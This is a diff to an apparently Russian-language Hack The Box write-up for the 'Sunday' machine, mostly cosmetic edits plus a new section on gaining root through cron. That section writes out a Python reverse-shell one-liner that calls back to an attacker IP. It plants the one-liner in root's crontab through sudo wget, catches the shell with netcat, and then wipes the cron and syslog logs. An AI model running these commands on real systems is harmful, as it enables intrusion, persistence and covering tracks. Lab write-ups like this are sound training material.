@@ -535,7 +535,7 @@ Connecting to 10.10.14.14:8881... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 363 [application/octet-stream]
 
-100%[====================================================>] 363           --.--K/s
+100%[=================================================>] 363           --.--K/s
 
 21:39:47 (23.38 MB/s) - `/etc/shadow' saved [363/363]
 ```
@@ -600,7 +600,7 @@ Connecting to 10.10.14.14:8881... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 152 [application/octet-stream]
 
-100%[====================================================>] 152           --.--K/s
+100%[=================================================>] 152           --.--K/s
 
 10:32:16 (9.64 MB/s) - `/etc/sudoers' saved [152/152]
 
@@ -640,7 +640,7 @@ Connecting to 10.10.14.14:8881... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 363 [application/octet-stream]
 
-100%[====================================================>] 291           --.--K/s
+100%[=================================================>] 291           --.--K/s
 
 11:10:06 (605.54 KB/s) - `/root/troll' saved [291/291]
 ```
@@ -692,7 +692,7 @@ fb40fab6????????????????????????
 [![sunday-root-troll.png]({{ "/img/htb/boxes/sunday/sunday-root-troll.png" | relative_url }})]({{ "/img/htb/boxes/sunday/sunday-root-troll.png" | relative_url }})
 
 ### 6. Исполняемый файл с SUID
-И последний способ, если не хочется попадать в тайминги troll'а, — это перезапись любого исполняемого файла с выставленным SUID'ом и владельцем root.
+Еще один способ, если не хочется попадать в тайминги troll'а, — это перезапись любого исполняемого файла с выставленным SUID'ом и владельцем root.
 
 Найти их все, кстати, можно с помощью `find`:
 ```text
@@ -744,7 +744,7 @@ Connecting to 10.10.14.14:8881... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 289 [application/octet-stream]
 
-100%[====================================================>] 289           --.--K/s
+100%[=================================================>] 289           --.--K/s
 
 20:57:00 (18.92 MB/s) - `/usr/bin/passwd' saved [289/289]
 
@@ -781,6 +781,77 @@ fb40fab6????????????????????????
 sammy@sunday:~# mv /tmp/rcp.bak /usr/bin/rcp
 ```
 
+### 7. cron
+Последний способ получения рута, который я опишу в рамках этого поста, это создание вредоносной cron-задачи.
+
+Проверим, что cron запущен:
+```text
+sammy@sunday:~$ ps auxww | grep cron
+root     17724  0.0  0.1 4340 1304 ?        S 12:10:09  0:00 /usr/sbin/cron
+
+sammy@sunday:~$ svcs -p svc:/system/cron
+STATE          STIME    FMRI
+online         12:10:09 svc:/system/cron:default
+               12:10:09    17724 cron
+```
+
+На локальной машине создадим файл с нужным job'ом (хотим, чтобы Sunday пробрасывал шелл на нашу машину каждую минуту):
+```text
+root@kali:~# cat cronjob
+* * * * * /usr/bin/python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",31337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()' > /dev/null 2>&1
+```
+
+Загрузим нашу прелесть на жертву в суперпользовательский crontab:
+```text
+sammy@sunday:~$ sudo /usr/bin/wget 10.10.14.14:8881/cronjob -O /var/spool/cron/crontabs/root
+--12:30:12--  http://10.10.14.14:8881/cronjob
+           => `/var/spool/cron/crontabs/root'
+Connecting to 10.10.14.14:8881... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 287 [application/octet-stream]
+
+100%[=================================================>] 287           --.--K/s
+
+12:30:13 (40.79 MB/s) - `/var/spool/cron/crontabs/root' saved [287/287]
+```
+
+Перезапустим cron, чтобы он увидел изменения (т. к. создавали задание не через `crontab`):
+```text
+sammy@sunday:~$ svcadm restart cron
+```
+
+И через пару секунд получим отстук на netcat, а там уже привычное:
+```text
+root@kali:~# nc -nlvvp 31337
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+Ncat: Connection from 10.10.10.76.
+Ncat: Connection from 10.10.10.76:56297.
+
+root@sunday:~# whoami
+root
+
+root@sunday:~# id
+uid=0(root) gid=0(root)
+
+root@sunday:~# cat /root/root.txt
+fb40fab6????????????????????????
+```
+
+В логах (которые мы сейчас почистим) видно, что все прошло успешно:
+```text
+root@sunday:~# cat /var/cron/log
+! *** cron started ***   pid = 19567 Thu Oct 11 12:30:19 2018
+>  CMD: /usr/bin/python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",31337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()' > /dev/null 2>&1
+>  root 19947 c Thu Oct 11 12:31
+```
+
+```text
+root@sunday:~# > /var/cron/log
+root@sunday:~# > /var/log/syslog
+```
+
 Фух, пожалуй на этом все с рутом :triumph:
 
 # Разное
@@ -815,11 +886,11 @@ done
 ```
 
 ```text
-root@sunday:~# ps auxw | grep overwrite
+root@sunday:~# ps auxww | grep overwrite
 root       517  0.1  0.1 5928 2180 ?        S 16:05:38  0:02 /usr/bin/bash /root/overwrite
 ```
 
-Встречайте: `overwrite` — скрипт, перезаписывающий `/root/troll`, оригинальным содержимым раз в 5 секунд. Поэтому ранее говорилось о том, что с первого раза диверсия по подмене troll'а могла не получиться.
+Встречайте: ~~`overkill`~~ `overwrite` — скрипт, перезаписывающий `/root/troll`, оригинальным содержимым раз в 5 секунд. Поэтому ранее говорилось о том, что с первого раза диверсия по подмене troll'а могла не получиться.
 
 ## agent22.backup
 ```text
